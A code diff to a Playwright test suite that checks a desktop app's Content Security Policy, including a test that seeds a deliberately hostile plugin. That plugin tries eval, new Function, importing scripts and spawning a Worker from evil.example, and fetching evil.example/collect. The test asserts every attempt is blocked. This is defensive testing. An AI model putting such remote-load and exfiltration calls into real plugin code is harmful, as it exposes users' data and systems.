@@ -1,6 +1,7 @@
 import { readFileSync } from "node:fs";
 import { expect, test } from "@playwright/test";
 import type { Page } from "@playwright/test";
+import { plugin, seedPlugins } from "./plugins-fixture";
 import { openSettings, seedConfig } from "./settings-fixture";
 
 // The Content Security Policy of the desktop app (apps/desktop/src-tauri/tauri.conf.json) applied to
@@ -73,6 +74,9 @@ test("the policy is the strict one the app ships", () => {
   expect(POLICY).toContain("default-src 'none'");
   expect(POLICY).toContain("script-src 'self'");
   expect(POLICY).not.toContain("unsafe-eval");
+  // The one door to a Worker (the plugins), and nothing else opened with it.
+  expect(POLICY).toContain("worker-src blob:");
+  expect(POLICY).toContain("frame-src 'none'");
   expect(POLICY).not.toMatch(/https?:\/\/(?!ipc\.localhost)/);
 });
 
@@ -209,4 +213,75 @@ test("inline styles are why style-src keeps unsafe-inline: the terminal writes a
     .poll(async () => (await violations(page)).map((v) => v.directive))
     .toContain("style-src-elem");
   expect(await page.locator(".xterm style").count()).toBeGreaterThan(0);
+});
+
+test("a plugin runs under the policy: its Worker comes from a blob and opens a tab with no violation", async ({
+  page,
+}) => {
+  const problems = await underPolicy(page);
+  await start(page);
+  const tabs = page
+    .getByRole("tree", { name: "Tabs", exact: true })
+    .locator('[data-nr-part="item"]');
+  await expect(tabs).toHaveCount(1);
+
+  await page.locator('[data-nr-part="pane"]:visible').click();
+  await page.keyboard.press("Control+Shift+P");
+  const palette = page.locator('[data-nr-part="palette"]');
+  await expect(palette).toBeVisible();
+  await palette
+    .getByRole("combobox", { name: "Command palette", exact: true })
+    .fill("example plugin");
+  const entry = palette.locator('[data-nr-kind="plugin"]');
+  await expect(entry).toHaveCount(1);
+  await expect(entry.first()).toHaveAttribute("aria-selected", "true");
+  await page.keyboard.press("Enter");
+  await expect(tabs).toHaveCount(2);
+
+  expect(await violations(page)).toEqual([]);
+  expect(problems).toEqual([]);
+});
+
+test("a plugin cannot use eval, new Function, import a script or reach the network", async ({
+  page,
+}) => {
+  await underPolicy(page);
+  const requested: string[] = [];
+  // A request that the policy lets through would reach this route; a refused one never does.
+  await page.route("https://evil.example/**", (route) => {
+    requested.push(route.request().url());
+    return route.abort();
+  });
+  // The plugin tells what each attempt did by registering an action named after it.
+  await seedPlugins(page, [
+    plugin(
+      "hostile",
+      ["palette.actions"],
+      `let n = 0;
+const said = (text) => globalThis.postMessage({ version: 1, id: ++n, method: "palette.register", params: { id: "r" + n, label: text } });
+const attempt = (name, run) => { try { run(); said(name + ": ran"); } catch (e) { said(name + ": blocked"); } };
+attempt("eval", () => eval("1 + 1"));
+attempt("function", () => new Function("return 1")());
+attempt("import", () => importScripts("https://evil.example/x.js"));
+attempt("worker", () => new Worker("https://evil.example/w.js"));
+fetch("https://evil.example/collect").then(() => said("fetch: ran"), () => said("fetch: blocked"));
+said("done: yes");`,
+    ),
+  ]);
+  await start(page);
+  await page.locator('[data-nr-part="pane"]:visible').click();
+  await page.keyboard.press("Control+Shift+P");
+  const palette = page.locator('[data-nr-part="palette"]');
+  await expect(palette).toBeVisible();
+  const results = palette.locator('[data-nr-kind="plugin"] .palette-title');
+  await expect(results).toHaveCount(6);
+  await expect(results).toHaveText([
+    "eval: blocked",
+    "function: blocked",
+    "import: blocked",
+    "worker: blocked",
+    "done: yes",
+    "fetch: blocked",
+  ]);
+  expect(requested).toEqual([]);
 });
